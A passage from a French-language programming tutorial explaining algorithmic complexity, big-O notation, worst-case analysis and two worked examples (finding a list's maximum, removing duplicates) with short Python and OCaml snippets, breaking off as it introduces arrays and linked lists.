(le mot est expliqué dans la prochaine section) moins efficace qu'un algorithme de faible complexité, il est donc généralement plus lent. Mais on peut avoir des algorithmes à très faible complexité qui sont extrêmement compliqués. L'idée en deux mots de la complexité algorithmique, c'est : si je donne à mon programme une entrée de taille $N$, quel est l'ordre de grandeur, en fonction de $N$, du nombre d'opérations qu'il va effectuer ? Elle repose sur le fait que les programmes qui résolvent un problème dépendent des conditions du problème : si les conditions changent, ils peuvent s'effectuer en plus ou moins de temps. La complexité permet de quantifier (mettre une formule mathématique) la relation entre les conditions de départ et le temps effectué par l'algorithme. Pour \"compter les opérations\", il faut décider de ce qu'est une opération. À cette question, les sages scientifiques n'ont pas pu répondre définitivement, parce que le choix dépend du problème (et même de l'algorithme) considéré. Il faut en fait choisir soi-même quelques petites opérations que l'algorithme effectue souvent, et que l'on veut utiliser comme opérations de base pour mesurer la complexité. Par exemple, pour faire une omelette, on peut considérer que les trois opérations de base sont de casser un œuf, de battre un œuf en omelette, et de faire cuire un œuf battu en omelette. On peut donc pour chaque recette compter le nombre d'œufs cassés, cuits et battus, et avoir ainsi une idée de la complexité de la recette (l'omelette étant un plat bien connu et codifié, on peut s'attendre à ce que toutes les recettes aient la même complexité : pour $N$ œufs, on effectue $3N$ opérations) : l'ajout de sel, poivre ou herbes est très rapide, et n'a pas besoin d'être pris en compte dans l'analyse de la complexité (donc indirectement des performances de ma recette). Par exemple, dans le cas de Haskell le fermier, on peut dire que pour $N$ rangées de grenouilles, il a besoin avec sa vieille méthode d'environ $N&#94;2$ déplacements de camion, et seulement de $N$ déplacements avec la nouvelle. C'est une bonne mesure de la complexité, car le déplacement du camion est vraiment l'opération importante à prendre en compte : c'est la plus longue des opérations simples (sortir une grenouille, choisir un lieu, etc.) qu'il effectue : on peut donc s'attendre à ce que le temps total soit quasiment exactement le temps passé en déplacement de camion, que l'on peut donc relier directement aux performances globales de son algorithme. Ne vous inquiétez pas si cette notion est toujours un peu floue pour l'instant, vous l'assimilerez sans doute mieux avec les deux exemples concrets dans le chapitre suivant. &#94;&#94; ​ Mesure 'asymptotique' J'ai dit que la complexité était une mesure du comportement asymptotique de l'algorithme. Que veut dire ce mot compliqué ? Il veut dire \"quand l'entrée devient très grande\" (voire même \"tend vers l'infini\"). \"entrée\" désigne ici la quantification des conditions de départ de l'algorithme. Dans le cas de Haskell le fermier, cela voudra dire \"quand il y a beaucoup de rangées de grenouilles\", par exemple 200. En informatique, \"beaucoup\" a un sens légèrement différent : un moteur de recherche dira \"quand il y a beaucoup de pages web\", comme par exemple, 100 milliards... Il y a deux conséquences (qui sont en fait liées aux fondements mathématiques de la notion de complexité, qui ne seront pas abordés ici). D'une part, les temps constants ne sont pas pris en compte. On appelle \"temps constants\" les délais qui ne dépendent pas de l'entrée. Par exemple, si avant d'emmener ses grenouilles en vacances, Haskell le fermier remet de l'huile de tournesol dans son camion, le temps de remplissage de son réservoir est considéré \"constant\" : qu'il aie 10 ou 100 rangées de grenouilles, cela met autant de temps. Comme on considère l'efficacité de l'algorithme quand il y a \"beaucoup\" de grenouilles, le temps de remplissage du réservoir sera négligeable devant le temps de déplacement des grenouilles. D'autre part, les \"facteurs multiplicatifs constants\" ne sont pas non plus pris en compte : la mesure de la complexité ne fait pas la différence entre un algorithme qui effectue (en fonction de $N$) $N$, $2N$ ou $157N$ opérations. Pourquoi cette décision ? Considérez les deux algorithmes suivants, dépendant de $N$ : faire N fois l'opération A faire N fois (l'opération B puis l'opération C) Dans le premier cas, on fait $N$ fois l'opération A, et dans le deuxième cas on fait au total $N$ fois l'opération B, et $N$ fois l'opération C. En admettant que ces deux algorithmes résolvent le même problème (donc sont corrects), et que toutes les opérations sont prises en compte pour la mesure de la complexité, le premier algorithme fait $N$ opérations et le deuxième $2N$. Mais est-ce que l'on peut dire lequel est le plus rapide ? Pas du tout, car cela dépend des temps mis par les trois opérations : peut-être que B et C sont tous les deux quatre fois plus rapides que A, et que globalement c'est donc l'algorithme en $2N$ opérations qui est le plus rapide. Plus généralement, les facteurs multiplicatifs n'ont pas forcément d'influence sur l'efficacité d'un algorithme, et ne sont donc pas pris en compte dans la mesure de la complexité. Cela permet aussi de répondre à notre question de tout à l'heure : si deux programmeurs ont deux ordinateurs, et que l'un est plus rapide que l'autre, il sera par exemple 3 fois plus rapide en moyenne ; ce facteur constant sera négligé, et les deux programmeurs peuvent donc comparer la complexité de leurs algorithmes sans problème. On a donc négligé pas mal de choses, ce qui aboutit à une notion plutôt simple et assez générale. Cette généralité fait de la complexité un outil très pratique, mais elle a évidemment des inconvénients : dans certains cas très particuliers, un algorithme plus complexe mettra en réalité moins de temps à s'effectuer (par exemple, les facteurs constants peuvent jouer en réalité un rôle très important : et si le réservoir de Haskell le fermier était énorme et mettait toute la journée à se remplir ?). Cependant, dans la grande majorité des cas, la complexité est une indication fiable des performances de l'algorithme. En particulier, le fait que ce soit une mesure asymptotique veut dire que les écarts entre deux complexités se font de plus en plus importants quand la taille de l'entrée augmente. Un algorithme en $N$ opérations longues sera peut-être un peu plus lent qu'un algorithme en $N \\times N$ opérations très rapides quand $N$ vaut 10 ou 20, mais pour $N = 3000$ ou $N = 8000000$, l'algorithme le moins complexe sera très certainement le plus rapide. Notation \"grand O\" On a vu que la complexité ne prenait en compte qu'un ordre de grandeur du nombre d'opérations (on néglige des choses). Pour représenter cette approximation on utilise une notation spécifique, la notation O. Par exemple, pour dire que (avec $N$ rangées de grenouilles) la première méthode de Haskell s'effectue en environ $N&#94;2$ opérations, on dit qu'elle a un complexité $O(N&#94;2)$. De même, la deuxième méthode, plus rapide, a une complexité $O(N)$. La notation O est comme un grand sac, qui permet de ranger ensemble des nombres d'opérations différents, mais qui ont le même ordre de grandeur. Par exemple, des algorithmes effectuant environ $N$ opérations, $2 \\times N+5$ opérations ou $\\frac{N}{2}$ opérations ont tous la même complexité : on la note $O(N)$ (lire \"grand O de N\"). De même, un algorithme en $(2 \\times N&#94;2 + 3 \\times N + 5)$ opérations aura une complexité de $O(N&#94;2)$ : on néglige les termes $3 \\times N$ et $5$ qui sont de plus petits degrés que $2N&#94;2$, donc croissent moins vite. Plus généralement, si $f(N)$ désigne une expression mathématique dépendant de la variable $N$ qui représente un nombre (le choix du nom de la variable $N$ est libre : on pourrait aussi la noter par exemple $E$, $P$ ou $R$), $O(f(N))$ désigne la complexité des algorithmes s'exécutant en \"environ\" (pour une signification bien précise de cet \"environ\") $f(N)$ opérations. La signification de la notation O (appelée aussi \"notation de Landau\") varie légèrement selon les auteurs, et certains utilisent d'autres notations approchantes (par exemple, on peut faire une distinction entre \"environ $N$ opérations ou (beaucoup) moins\" et \"précisément environ $N$ opérations\", mais utiliser O pour exprimer précisément la complexité d'un algorithme est une convention commune aux scientifiques du domaine. Si vous décidez de vous spécialiser dans l'algorithmique (ou que vous avez la chance d'étudier les comportements asymptotiques en analyse), il vous faudra sans doute approfondir un peu plus les fondements formels de cette notation, mais cela devrait largement suffire pour ce texte, et plus généralement pour une compréhension solide de la complexité des algorithmes (qui dépend en pratique remarquablement peu des subtilités mathématiques de la notation O). Complexité en temps, complexité mémoire On peut faire plusieurs choix pour exprimer le plus précisément possible la complexité d'un algorithme. On a choisi tout d'abord une quantification des conditions d'entrée, par exemple par la variable $N$ (pour $N$ rangées de grenouilles, $N$ pages web, $N$ réacteurs nucléaires, etc.). On peut évidemment choisir un autre nom de variable, mais surtout on peut avoir plusieurs variables différentes. Si on cherche à tondre la pelouse d'un jardin rectangulaire, on exprimera sans doute sa complexité en fonction à la fois de la largeur $L$ et de la longueur $R$ du jardin. De même, si Haskell le fermier avait plus de rangées de grenouilles que de marécages disponibles, il pourrait calculer ses algorithmes en fonction à la fois du nombre $N$ de rangées de grenouilles et du nombre $M$ de marécages. Mais un autre choix important est celui du type des opérations à mesurer. On a parlé jusqu'ici d' efficacité ou de performances , termes plutôt flous, ou de rapidité . Il faut savoir, et c'est très important, que les programmeurs ne s'intéressent pas uniquement au temps d'exécution de leurs algorithmes. Il peuvent en mesurer bien d'autre caractéristiques, la plus courante étant la consommation mémoire . C'est aussi une mesure de la complexité. Si par exemple vous avez besoin d'allouer en moyenne N Kilo-octets de mémoire pour un algorithme dont l'entrée est de taille $N$, la complexité mémoire est en $O(N)$. Plus généralement, on ne connaît pas la taille concrète (en octets) demandée par l'algorithme, mais un ordre de grandeur des structures utilisées : si vous utilisez $N$ tableaux de taille $N$ (par exemple, un par rangée de grenouilles, qui contient le nom de chacune des grenouilles de la rangée) vous avez une complexité mémoire en $O(N&#94;2)$. Si on remarque qu'on n'a besoin que d'une rangée à la fois, et qu'on n'alloue qu'un seul tableau à la fois au lieu de $N$ en même temps, on a une complexité en $O(N)$. Il est intéressant en général de mesurer à la fois la complexité en temps (la rapidité d'exécution) et en mémoire (la quantité d'espace occupé pendant l'exécution) de l'algorithme. Dans les cas simples la complexité mémoire est très simple, mais pour des problèmes plus compliqués, elles peuvent interagir de manière très riche : on peut choisir par exemple de sacrifier un peu de rapidité d'exécution pour utiliser moins de mémoire, ou au contraire d'augmenter la vitesse en augmentant la complexité en mémoire de notre algorithme, par exemple en stockant dans un tableau les résultats déjà calculés (c'est le principe de la mise en cache ). Plus les contraintes sur les programmes sont fortes, plus on a besoin d'informations précises. Dans certains domaines de l'informatique on s'intéressera à d'autres caractéristiques, parfois mesurables elles aussi en terme de complexité, des algorithmes. Par exemple, un programmeur pour calculatrice ou système embarqué pourra s'interroger sur la consommation électrique de son algorithme, afin d'économiser la batterie. Dans le cas général, on s'intéressera cependant uniquement aux complexités en temps et en mémoire, et même principalement à la complexité en temps. Complexité dans le pire des cas Le nombre d'opérations qu'effectue un algorithme dépend évidemment des conditions de départ. Par exemple, voici un algorithme très simple permettant de savoir si une valeur donnée se trouve ou non dans une liste de valeurs (par exemple \"est-ce que j'ai déjà mis la farine dans ma liste de course ?\") : pour savoir si la valeur se trouve dans la liste, on parcourt la liste, en s'arrêtant si on trouve la valeur recherchée. Si on a parcouru toute la liste sans rien trouver, c'est qu'elle ne contient pas la valeur recherchée. Imaginons que l'élément que l'on cherche ne se trouve pas dans la liste, et que celle-ci est de taille $L$. Pour vérifier qu'elle ne s'y trouve pas, l'algorithme a parcouru tous les éléments de la liste, en comparant chaque élément avec celui que l'on cherche : on a donc effectué $L$ comparaisons. On peut donc dire que notre algorithme a une complexité de $O(L)$. On dit aussi qu'il s'exécute en temps linéaire (car sa progression est linéaire : si on double la taille de la liste d'entrée, il mettra deux fois plus de temps, de même que si on double la longueur d'une ligne droite, vous mettrez deux fois plus de temps à la parcourir). Mais que se passe-t-il si l'élément recherché se trouve au tout début de la liste ? Par exemple, si \"farine\" se trouve en premier dans notre liste de course, on s'en apercevra immédiatement et on arrêtera la recherche après avoir fait une opération seulement. Dans d'autres cas on s'arrêtera au bout de 2, 3 opérations, même si la liste contient 5000 éléments. C'est là qu'intervient la notion de \"pire des cas\" : quand on calcule la complexité d'un algorithme, on peut considérer que l'entrée donnée est la \"pire\" possible pour notre algorithme. Ici par exemple, on calculera le nombre d'opérations avec une entrée qui demande le plus grand nombre d'opérations (et non pas juste une ou deux), c'est à dire une liste qui ne contient pas la valeur recherchée. C'est une sorte de sécurité du point de vue du programmeur : les complexités calculées étant dans le \"pire des cas\", il sait que ça se passera forcément mieux. De la même façon que les programmeurs web sécurisent leurs applications en se demandant \"qu'est-ce que l'utilisateur le plus malicieux pourra entrer comme texte pour pirater mon site ?\", l'algorithmicien se demande \"quelle est la liste vicieuse qui fera prendre plein de temps à mon algorithme, et combien ?\". Cette méthode permet de mesurer ce qu'on appelle \"complexité dans le pire des cas\". Dans le cadre de ce tuto, nous nous intéresserons quasi-uniquement à cette méthode de mesure, donc les complexités seront toujours (sauf indication expresse) exprimées dans ce cadre. L'intérêt pour le pire des cas vient du fait que très souvent, une situation quelconque a un comportement assez proche du pire des cas. Pour notre exemple, supposons que l'élément se trouve effectivement dans la liste, mais qu'il soit placé à une position aléatoire, inconnue du programmeur. Elle a autant de chances de se trouver au début de la liste (donc qui s'arrête très vite), qu'au milieu ou carrément à la fin (on doit alors parcourir toute la liste). En moyenne, on fera donc un demi-parcours par essai : entre un parcours complet et un demi-parcours, il y a seulement un facteur multiplicatif constant, donc c'est équivalent du point de vue de la complexité. Il existe des algorithmes dont le cas \"moyen\" et le pire des cas ont une complexité très différente. Dans ce cas, il est possible de faire des études plus approfondies, avec d'autres méthodes de calcul de la complexité, mais ce sujet plus délicat ne sera pas abordé pour l'instant. Un peu de pratique Qu'est-ce qu'on attend de vous ? C'est bien beau, la complexité, mais quel est le rapport avec un \"cours d'algorithmique\" ? L'algorithmique est la science de la conception et de l'étude des algorithmes. Elle est bien antérieure à l'informatique que nous connaissons, mais aujourd'hui pratiquée quasi-exclusivement par des scientifiques informaticiens. C'est un domaine très vaste, et qui demande un niveau avancé de connaissances mathématiques. Tous les informaticiens n'ont pas besoin d'être des algorithmiciens de génie. En effet, les problèmes auxquels sont confrontés la plupart des programmeurs sont en réalité assez simples du point de vue algorithmique, et jouent sur beaucoup d'autres aspects et difficultés de la programmation (fiabilité face aux bugs, respect des spécifications, ergonomie de l'interface, interopérabilité, etc.). Cependant, vous aurez quelque fois besoin de mettre en place quelque chose d'un peu plus sophistiqué. Dans ce cas, des connaissances de base en algorithmique pourraient se révéler très utiles. On ne vous demande pas d'inventer vous-mêmes un nouvel algorithme révolutionnaire et de faire une preuve béton de sa complexité, mais ne serait-ce que pour pouvoir utiliser de manière adaptée les algorithmes que vous trouverez sur le net ou dans vos bibliothèques logicielles, il est nécessaire d'avoir une formation de base. Une connaissance de l'algorithmique vous permettra donc d'être plus efficace, de comprendre mieux les indications sur ce sujet qui vous entourent, et aussi de ne pas écrire de choses aberrantes : certains codes sont justes mais sont absurdes d'un point de vue algorithmique. Là où un programmeur non averti risquera de les utiliser (\"ça marche donc ça va\"), vous repérerez rapidement le problème et pourrez mettre en place une vraie solution. Tout au long de ce cours, nous donnons un certain nombre d'exemples d'implémentations dans des langages divers, comme le langage C , Python ou encore OCaml. Ces codes sont là soit pour communiquer les algorithmes (ce qui vous permet de les exécuter directement sur des exemples pour vérifier que vous comprenez), soit pour vous prouver que nous ne faisons rien de trop compliqué. Si votre langage préféré n'apparaît pas, c'est tant mieux ! Vous pourrez vous entraîner en traduisant les programmes. Exécutez-les ensuite sur quelques exemples pour vous assurer qu'ils sont corrects — et si vous rencontrez un problème, venez nous en parler sur le forum. Après ces palabres, vous avez sans doute envie de mettre un peu les mains dans le cambouis. Voici deux petites études de complexité très simples, qui devraient vous permettre d'avoir une idée un peu plus précise des raisonnements destinés à mesurer la complexité. Chercher le plus grand / petit élément Vous disposez d'une liste d'entiers positifs, et vous voulez trouver le plus grand de la liste. La façon classique de procéder est la suivante : on parcourt la liste en conservant tout du long : l'élément le plus grand trouvé jusqu'à présent, que l'on nomme \"maximum actuel\". Au début, le maximum actuel est 0. On compare chaque élément avec le maximum actuel : s'il est plus grand que le maximum connu, il devient le maximum actuel à son tour. À la fin du parcours, le maximum actuel est le maximum de tout le tableau. Voici deux implémentations de cet algorithme, l'une en Python, l'autre en OCaml : def maximum ( liste ): max_actuel = 0 for elem in liste : if elem > max_actuel : max_actuel = elem return max_actuel let maximum liste = let rec parcours max_actuel = function | [] -> max_actuel | elem :: reste -> parcours ( max max_actuel elem ) reste in parcours 0 liste On peut en fait utiliser des fonctions des bibliothèques du langage pour implémenter notre algorithme de manière bien plus concise, mais ce n'est pas le sujet de ce tutoriel. On peut rapidement vérifier que cet algorithme est correct : il s'agit de vérifier que le maximum actuel contient bien, pendant toute l'exécution de l'algorithme, le plus grand des éléments de la liste lus jusqu'à présent. C'est vérifié dès la lecture du premier élément (puisqu'il est positif, et comparé à 0), et cette propriété est conservée quand on lit l'élément suivant : s'il est plus petit que le maximum courant, il ne se passe rien, et s'il est plus grand il devient le nouveau maximum courant, qui reste donc bien le plus grand élément lu. À la fin de l'algorithme, il contient le plus grand des éléments lus, donc (comme on a lu toute la liste), le plus grand des éléments de la liste. On peut remarquer que l'algorithme \"termine\", ne boucle pas à l'infini : en effet, il parcourt toute la liste puis s'arrête, donc s'arrête si la liste est finie. Cela a l'air d'un détail sans importance, mais il existe en réalité des langages pouvant représenter des listes (ou séquences) infinies d'éléments : dans ce cas, notre algorithme ne serait pas correct. Passons maintenant à l'étude de la complexité proprement dite. Quelles sont les opérations à prendre en compte ? Clairement, le gros du travail consiste à comparer l'élément courant avec le maximum actuel (ce n'est pas par exemple l'initialisation de la variable max_actuel qui occupe le temps d'exécution de l'algorithme). On va donc compter le nombre de comparaisons. De quels paramètres dépend le temps d'exécution de l'algorithme ? Il ne dépend pas de la valeur des éléments de la liste (note : on suppose que la comparaison de deux entiers s'effectue en temps constant, quelle que soit leur valeur. Certains langages peuvent représenter des entiers de très très grande taille et ce n'est alors plus forcément vrai). On choisit de quantifier l'entrée selon la longueur $N$ de la liste d'éléments. Pour une liste de $N$ éléments, on effectue $N$ comparaisons : une par élément, avec le maximum actuel. La complexité de l'algorithme est donc en $O(N)$ : il s'effectue en temps linéaire. Qu'en est-il de la complexité mémoire ? L'algorithme utilise une liste d'éléments, qui occupe sans doute de la place en mémoire. Cependant, cette liste existait déjà avant qu'on en cherche le plus grand élément, et n'a pas été allouée par notre algorithme : on ne la prend pas en compte pour la mesure de la complexité mémoire (on ne compte que la mémoire directement réclamée par l'algorithme). Celui-ci n'effectue pratiquement aucune allocation, au pire une variable temporaire, pour stocker le maximum actuel. Cet espace mémoire ne dépend pas de la longueur de la liste : l'occupation mémoire de notre algorithme est constante (on note aussi $O(1)$, pour dire que ça ne dépend pas de $N$). Il reste un petit détail à remarquer au sujet de notre algorithme : si la liste d'éléments que l'on lui fournit est vide, il renvoie 0. Dire que le maximum d'une liste vide est 0 n'est pas forcément correct : dans certains cas, il vaudrait mieux renvoyer une erreur. On peut donc modifier notre algorithme comme ceci : au lieu de considérer que le maximum actuel au départ vaut 0, on fixe sa valeur à celle du premier élément de la liste (si la liste est vide, on renvoie une erreur). On continue alors les comparaisons en partant du deuxième élément. Ce nouvel algorithme effectue $N-1$ comparaisons (vu qu'on ne compare pas le premier élément à lui-même). Cependant, cela ne change pas la complexité : la différence de temps entre $N$ et $N-1$ comparaisons ne dépend pas de $N$, elle est constante. On peut donc la négliger (pour des listes un peu grandes, cela ne fera aucune différence) : les deux algorithmes ont la même complexité, ils sont linéaires (c'est-à-dire en $O(N)$). Enfin, on peut remarquer que le deuxième algorithme marche aussi pour des nombres négatifs (alors que si la liste ne contient que des nombres strictement négatifs, le premier algorithme renvoie 0, ce qui est faux). Il est donc plus général, et sans doute préférable. ​ Trouver les éléments uniques Voici un deuxième problème dont la solution présente une complexité facile à étudier. On dispose (encore !) d'une liste d'éléments, qui contient des doublons que l'on veut éliminer : on veut récupérer la même liste, mais où chaque élément ne serait présent qu'une seule fois. Pouvez-vous penser à un algorithme permettant de faire cela ? Essayez de le chercher, avant de lire la solution proposée ici. Solution proposée L'algorithme proposé est le suivant : On constitue une \"liste des éléments uniques déjà rencontrés\" (que l'on va appeler U comme Unique), qui au départ est vide. On parcourt la liste donnée en entrée, et pour chaque élément, on regarde s'il est présent dans U (on peut utiliser pour cela l'algorithme présenté dans la section précédente). S'il n'y est pas, on l'y ajoute. À la fin du parcours, U contient tous les éléments uniques de la liste de départ : on peut la renvoyer, c'est une solution à notre problème. Exercice : implémentez l'algorithme de récupération des éléments uniques d'une liste dans le langage de votre choix. Complexité Quelle est la complexité de cet algorithme ? Si vous avez bien compris le calcul de la complexité des algorithmes précédents, celui-ci vous paraît peut-être simple, mais autant faire trop que pas assez. Pour chaque élément de la liste de départ, on effectue un parcours de la liste U, donc autant d'opérations que U a d'éléments. Le problème c'est que la taille de U change pendant le parcours de la liste de départ, puisqu'on y ajoute des éléments. Quand on considère le premier élément, la liste U est vide (donc on n'effectue aucune opération). Quand on considère le deuxième élément, U a 1 élément, donc on effectue une opération de plus. Mais quand on arrive au troisième élément, on ne peut plus être aussi sûr : soit les deux premiers éléments étaient différents, et ils ont tous les deux été ajoutés à U, et dans ce cas on effectue 2 opérations, soit ils étaient égaux et le deuxième n'a pas été ajouté : on n'effectue qu'une seule opération. Comme on l'a déjà dit, on calcule la complexité dans \"le pire des cas\" : c'est-à-dire celui qui nous fait faire le plus d'opérations. On va donc considérer que tous les éléments de la liste de départ sont différents (puisque c'est la situation qui crée la liste U la plus grande, et donc demande le plus d'opérations). Dans le pire des cas, on ajoute à U tous les éléments de la liste de départ, un par un. Au n-ième élément de la liste de départ, on a donc ajouté les $(n-1)$ éléments précédents, ce qui fait $n-1$ opérations. On a donc au total $0 + 1 + 2 + ... + (L-1)$ opérations ($L-1$ opérations pour le dernier élément de la liste). On a fait très peu d'opérations au début mais beaucoup d'opérations à la fin : cela se compense et au total cela fait environ $\\frac{L \\times L}{2}$, soit $\\frac{L&#94;2}{2}$, opérations (si vous ne connaissez pas la formule, vous trouverez une analyse plus détaillée de cette somme dans le tuto sur le tri par insertion . Notre algorithme a donc une complexité en temps de $O(L&#94;2)$ : on enlève le facteur $\\frac{1}{2}$ constant. Il faut savoir que pour $O(L&#94;2)$ on dit aussi \"quadratique\" (comme on dit \"linéaire\" pour $O(L)$), parce que ça augmente \"au carré\". En plus d'être plus lent, l'algorithme a aussi une complexité en mémoire plus importante : on a construit une liste (donc demandé de l'espace mémoire) qui n'existait pas au départ. Dans le pire des cas, la liste U a autant d'éléments que la liste de départ : on aurait donc alloué de l'espace pour $L$ éléments, ce qui fait une complexité mémoire de $O(L)$ : l'utilisation mémoire était constante pour le premier algorithme, elle est maintenant linéaire. On peut au passage remarquer que cet algorithme demande uniquement de comparer des éléments entre eux. En particulier, ils n'ont pas besoin d'être des entiers naturels : on pourrait très bien utiliser le même algorithme pour éliminer des doublons dans une liste de mots, de couples de nombres à virgule, etc. De nombreux algorithmes s'expriment ainsi, indépendamment du type concret des éléments des structures manipulées. Trouver les éléments uniques : autre solution Il existe une autre solution, à laquelle vous avez peut-être (si vous êtes un peu tordus :p ) pensé en réfléchissant à l'algorithme : il est possible de commencer par trier les éléments de la liste. Ainsi, tous les éléments identiques se retrouvent côte à côte, et il devient très simple d'éliminer les doublons : Il suffit de parcourir la liste en se souvenant du dernier élément parcouru. Si l'élément actuel est le même que l'élément précédent, alors c'est un doublon et on ne l'inclut pas dans la liste des éléments uniques. L'algorithme n'est plus valable si les éléments égaux ne sont pas juste à côté les uns des autres, donc il faut forcément trier la liste avant. Quelle est sa complexité ? L'élimination des doublons se fait en un seul parcours de la liste, elle est donc linéaire. Mais comme on a dû trier la liste avant, ce tri a aussi effectué des opérations qu'il faut prendre en compte dans la complexité totale de ce deuxième algorithme. C'est un peu de la triche, parce que vous ne savez pas encore comment trier les éléments d'une liste (j'espère que vous saurez le faire, et même de plusieurs manières différentes, à la fin de ce cours). Vous aurez donc dû utiliser une des fonctions de votre langage de programmation ou d'une bibliothèque externe fournie à côté, ce qui ne correspond pas forcément à la définition d'un algorithme, qui demande des descriptions \"précises, à l'aide de concepts simples\" : on peut attendre d'un ordinateur qu'il sache parcourir une liste ou comparer des éléments, mais trier c'est plus difficile (un peu comme ranger sa chambre, ou sa centrale nucléaire). Quand vous connaîtrez de nombreux algorithmes, vous pourrez facilement les utiliser pour mettre au point vos propres solutions, mais actuellement vous devriez vous limiter à ce que vous avez déjà conçu (donc, pas de tri de tableau). Dans tous les cas, cette méthode marche, et le fait que ce soit de la triche ne me permet pas d'esquiver la question de la complexité. Il se trouve que la complexité de cet algorithme dépend de la complexité du tri : si par exemple le tri effectue environ $L&#94;2$ opérations, c'est beaucoup plus que les $L$ opérations que l'on fait ensuite, et la complexité globale est bien en $O(L&#94;2)$. Cependant, il existe des tris plus sophistiqués (et plus compliqués) qui, tout en faisant toujours plus de $L$ opérations (et en ayant dans le cas général une complexité plus grande que $O(L)$), font beaucoup moins de $O(L&#94;2)$ opérations. Nous le verrons le moment venu, mais ces tris là produisent un algorithme plus efficace que le premier proposé, qui est plus \"naïf\". Enfin, il faut noter qu'il n'est pas nécessaire de trier la liste pour obtenir un algorithme plus efficace. On peut aussi choisir d'utiliser à la place de la liste U une structure de données plus efficace : dans notre cas, il faudrait qu'elle puisse répondre rapidement à la question \"l'élément machin a-t-il déjà été rencontré ?\". Si l'on peut y répondre sans parcourir toute la structure (comme on fait pour U), on peut avoir un algorithme plus rapide. De telles structures de données existent, et permettent d'obtenir un algorithme aussi efficace qu'avec le tri (en plus, comme il est proche de l'algorithme naïf, il est plus naturel à concevoir et plus facile à comprendre), mais nous ne les aborderons pas non plus tout de suite. Vous avez maintenant déjà trois algorithmes dans votre carquois. La recherche d'un élément donné dans une liste, et la recherche du plus grand élément d'une liste sont des algorithmes assez proches, linéaire en temps (en $O(N)$) et à utilisation mémoire constante (en $O(1)$). L'élimination des éléments en double dans une liste est plus compliquée, puisque l'algorithme le plus simple a une complexité quadratique (en $O(N \\times N)$) en temps et linéaire en mémoire. J'espère que ces études plus concrètes (mais avec encore un peu trop de blabla) vous ont convaincus que cette discipline servait quand même parfois à quelque chose, et que vous commencez à vous habituer aux concepts de base : algorithme, complexité en temps et en mémoire, structure de données. Vous avez maintenant des connaissances de base sur la complexité des algorithmes. Si vous êtes un apprenti programmeur, vous avez certainement déjà écrit un certain nombre de programmes, dont certains trainent encore sur votre disque dur. Êtes-vous capable d'en choisir quelques-uns, d'identifier certains algorithmes que vous utilisez et de calculer la complexité de ces derniers ? Si vous désirez en apprendre davantage au sujet de la complexité, vous pouvez par exemple commencer à lire l'article de Höd sur la complexité des problèmes . Attention toutefois, il est nettement plus avancé que ce cours. Ne vous découragez pas si vous peinez à le comprendre : c'est l'occasion d'aller faire un tour sur le forum. :) Premiers exemples de structures de données et d'algorithmes courants Notions de structures de données : tableaux et listes chaînées Maintenant que vous avez vos premières notions concernant ce qu'est la complexité algorithmique, il est temps de faire une introduction au concept de structure de données que l'on vous a fait miroiter dans l'introduction. Tout comme la première partie, nous ne ferons rien de compliqué pour l'instant, mais les bases présentées ici seront utiles pour la suite du cours. Nous nous concentrerons sur deux structures extrêmement courantes : les listes (simplement chaînées) et les tableaux . Définition Le principe de base d'une structure de données, c'est de stocker des éléments auxquels le programmeur veut pouvoir accéder plus tard. On appelle les différentes utilisations possibles de la structure de données des opérations . Par exemple, une opération courante est la lecture : on veut récupérer un élément stocké dans la structure. Il existe de nombreuses autres opérations, comme l' insertion , qui rajoute un nouvel élément dans la structure de données, ou la suppression , qui en enlève. Toutes les structures de données ne permettent pas les mêmes opérations, et surtout elles n'ont pas toujours le même coût . Par exemple, sur certaines structures, il est très rapide d'ajouter un élément, dans d'autres c'est difficile et cela peut demander une réorganisation complète. Le coût des structures de données peut se mesurer assez finement, mais ce qui nous intéresse dans ce cours, c'est la complexité : pour chaque structure de données utilisée, on essaiera d'avoir une bonne idée de la complexité des opérations que l'on effectue. Cette connaissance des coûts a deux intérêts : quand on nous donne un algorithme utilisant une structure de données particulière, on a besoin de connaître le coût (la complexité) des opérations effectuées pour évaluer la complexité globale de l'algorithme. Mais surtout, et c'est sans doute l'aspect le plus intéressant, quand on a une idée des opérations dont on a besoin pour un algorithme, on peut choisir la structure de données la plus adaptée (celle pour laquelle ces opérations sont les moins coûteuses). Dans la pratique, la plupart des gens utilisent des algorithmes assez simples (qui ne reposent pas sur des manipulations sophistiquées), où le seul choix de la bonne structure de données peut faire la différence au niveau des performances. Bien connaître ses structures de données et savoir faire un choix joue donc un rôle très important pour le programmeur. Tableaux Le tableau est sans doute la structure de données la plus courante, du moins dans les langages dérivés ou inspirés par le langage C . Le principe d'un tableau est très simple : on stocke les éléments dans des cases, chaque case étant étiquetée d'un numéro (généralement appelé indice ). Pour accéder à un élément particulier d'un tableau, on donne son indice. Les indices sont des entiers consécutifs, et on considérera qu'ils commencent à 0, comme dans la plupart des langages de programmation. Le premier élément est donc à l'indice 0, le deuxième à l'indice 1, etc. (attention au décalage). En particulier, si n est la taille du tableau, le dernier élément se trouve à l'indice n-1 . Demander l'accès à un indice qui n'existe pas provoque une erreur. On considère que la taille d'un tableau est toujours connue (le programmeur a dû la connaître quand il a demandé la création du tableau, et ensuite il suffit de la conserver). Le temps de création du tableau dépend des langages. En général, la fonction de création met dans chaque case une valeur par défaut, et son temps d'exécution est alors proportionnel à la longueur du tableau (donc en complexité $O(N)$ si $N$ est la taille du tableau). Cependant, il est possible dans certains langages de créer des tableaux \"non initialisés\" (avec des valeurs inconnues pour chaque case) plus rapidement. C'est une pratique qui peut être dangereuse car on a alors parfois des valeurs qui n'ont aucun sens dans notre tableau. On considérera ici que tous les tableaux sont initialisés dès leur création, et donc qu'elle est toujours en $O(N)$. Listes La liste est une structure de données extrêmement utilisée. En particulier, elle a joué un rôle majeur dans le langage Lisp et reste très présente dans les nombreux langages qui s'en sont inspirés. Remarque : pour décrire correctement une liste, je suis forcé de m'écarter légèrement des pures considérations algorithmiques, pour détailler un peu plus précisément la manière dont les langages de programmation gèrent les structures de données. Je vais utiliser ici une description indépendante du langage de programmation : on parlera de cellules possédant un ou plusieurs champs . Une cellule est tout simplement un ensemble de cases qui permettent de stocker des données, et auxquelles on accède par leur nom (que l'on appelle nom du champ , comme les champs des formulaires par exemple). Par exemple, on pourra décrire une structure servant à stocker l'adresse et le numéro d'une personne comme une cellule à trois champs, nom , adresse et téléphone . Selon votre langage, les cellules auront des formes différentes : struct en C, objets en Java, etc. : à vous de choisir la traduction qui vous plaît le plus. Nous ne rentrerons pas non plus dans les détails de bas niveau sur l'organisation mémoire, mais il est bon d'avoir un modèle commun pour pouvoir discuter. On considérera de plus que la création (et la destruction) d'une cellule (si elle a un nombre fixé de champs), ainsi que la lecture ou la modification d'un champ, se fait en temps constant. Venons-en maintenant à 